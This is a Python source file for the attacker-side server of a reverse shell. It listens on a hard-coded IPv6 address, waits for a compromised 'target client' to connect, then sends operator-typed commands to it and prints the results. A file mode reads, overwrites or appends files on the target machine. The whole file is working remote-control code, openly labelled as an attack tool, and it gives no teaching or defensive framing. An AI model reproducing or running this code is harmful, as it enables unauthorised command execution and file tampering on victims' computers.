import socket

BUFFER_SIZE = 4096 * 8
attacker_server = socket.socket(socket.AF_INET6, socket.SOCK_STREAM) 

# lets the attacker server listen on the specified port number
def attacker_server_binder(hostname, port_number):
    attacker_server.bind((hostname, port_number))
    attacker_server.listen(5)


# listening for connections
def target_client_connection_receiver():
    while True:
        # receive connection from target client
        target_client, target_client_address = attacker_server.accept()
        
        if(target_client != None):
            break
    print("Connection established to target\n$reverse_shell: ", end="")
    return target_client


# connects to the client being targeted
def send_data(data, target_client):
    
    target_client.send(bytes(data, 'utf-8'))
    acknowledgement =  target_client.recv(BUFFER_SIZE)
    if(acknowledgement == b'ACK'):
        # print("Data received at target end")
        receive_data(target_client)
    else:
        print("Acknowledgement receipt not received.\n$reverse_shell: ", end = "")


def receive_data(target_client):
    response = ""
    while True:
        received_data = target_client.recv(BUFFER_SIZE)
        received_data = received_data.decode('utf-8')
        response = response + received_data
        if(len(received_data) < BUFFER_SIZE):
            break
    print(response + "\n$reverse_shell: ", end= "")

    
def command_handler(target_client):
    data = str(input())
    try:
        data.index('file')
        file_handler(target_client, data)
        return
    except:
        pass
    send_data(data, target_client)


def file_handler(target_client, command):
    target_client.send(bytes(command, 'utf-8'))
    acknowledgement = target_client.recv(BUFFER_SIZE)
    if(acknowledgement == b'ACK'):
        pass
    data_splits = command.split(' ')
    mode = data_splits[2]
    if(mode == 'r'):
        receive_data(target_client)
            
    elif(mode == 'w' or mode == 'a'):

        print("enter FILE_UPDATE_QUIT to end data transfer")
        while True:
            data = str(input("--> "))
            target_client.send(bytes(data, 'utf-8'))
            if(data == 'FILE_UPDATE_QUIT'):
                break
        receive_data(target_client)

def main():
    attacker_server_binder("2405:204:a38a:708d:4dfd:c0ac:2ba2:3a06", 12345)

    # receive connection from target client
    target_client = target_client_connection_receiver()

    while True:
        command_handler(target_client)

main()